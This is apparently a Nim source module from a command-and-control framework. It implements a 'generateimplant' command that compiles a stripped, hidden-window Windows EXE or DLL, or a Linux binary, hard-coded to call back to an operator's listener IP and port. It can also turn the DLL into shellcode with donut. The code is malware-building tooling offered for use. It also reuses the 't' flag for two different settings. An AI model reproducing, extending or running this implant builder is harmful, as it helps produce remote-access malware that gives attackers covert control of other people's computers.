import std/[
  osproc, 
  os,
  strutils, 
  asyncdispatch, 
  tables
]

import ../../types
import ../../logging

proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
  
  var listenerType: string = flags.getOrDefault("type", flags.getOrDefault("t", ""))
  var listenerName: string = flags.getOrDefault("listener", flags.getOrDefault("l", ""))
  var platform: string = flags.getOrDefault("platform", flags.getOrDefault("P", "windows"))
  var ip: string = flags.getOrDefault("ip", flags.getOrDefault("i", ""))
  var port: string = flags.getOrDefault("port", flags.getOrDefault("p", ""))
  var format: string = flags.getOrDefault("format", flags.getOrDefault("f", "exe"))
  var showWindow: bool = parseBool(flags.getOrDefault("showwindow", flags.getOrDefault("s", "no")))
  var autoConnectTime: string = flags.getOrDefault("autoconnect", flags.getOrDefault("t", "5000"))

  when not defined(windows):
    if format == "shellcode":
      errorLog "can't generate shellcode on linux"
      return

  # infoLog "generating implant for " & $tcpListener
  if listenerType == "tcp" and ip == "" and port == "":
    errorLog "you must specify and --ip and --port for the tcp client"
    return
  else:
    for listener in server.listeners:
      if listener.title == listenerName:
        infoLog "generating an implant for " & $listener
        ip = listener.ipAddress
        port = $listener.port.uint
        listenerType = listener.listenerType

  var createShellcode = false
  if format == "shellcode":
    format = "dll"
    createShellcode = true

  let compileCommand = "nim c -d:client " &
    (if showWindow or format == "dll": "" else: "--app=gui " & " ") & # disable window
    (if format == "dll": "--app=lib --nomain " else: "") & 
    "--passL:-s" & " " &  
    "-d:release" & " " &  
    "-d:ip=" & ip & " " & 
    "-d:" & listenerType & " " & 
    "-d:port=" & port & " " & 
    "-d:autoConnectTime=" & autoConnectTime & " " & 
    (if platform == "windows": "-d:mingw " else: "--os:linux ") & 
    (if server.debug: "-d:debug " else: "") & 
    "-o:implant" & 
    (
      if platform == "windows" and format == "dll": ".dll" 
      elif platform == "windows" and format == "exe": ".exe" 
      else: ""
    ) & " " &
    "./src/client/client.nim"

  infoLog "Running: " & compileCommand
  
  var exitCode = execCmd(compileCommand)

  if exitCode != 0:
    errorLog "failed to compiled implant"
  else:
    infoLog "successfully saved implant" & (if createShellcode: ", now building shellcode.." else: "")
  
  if not createShellcode: return

  if not fileExists("tools/donut/donut.exe"):
    errorLog "couldn't find donut at ./tools/donut/donut.exe"
    return

  exitCode = execCmd("tools/donut/donut.exe -f ./implant.dll")

  removeFile("implant.dll")

let cmd*: Command = Command(
  execProc: execProc,
  name: "generateimplant",
  aliases: @["gi"],
  argsLength: 3,
  usage: @[
    "generateimplant -l:[listenerName] -P:[platform] -t:[autoConnectTimeout]",
    "generateimplant -t:[listenerType] -i:[ip] -p:[port] -P:[platform] -t:[autoConnectTimeout]",
  ],
  description: "Generate an implant",
  category: CCImplants
)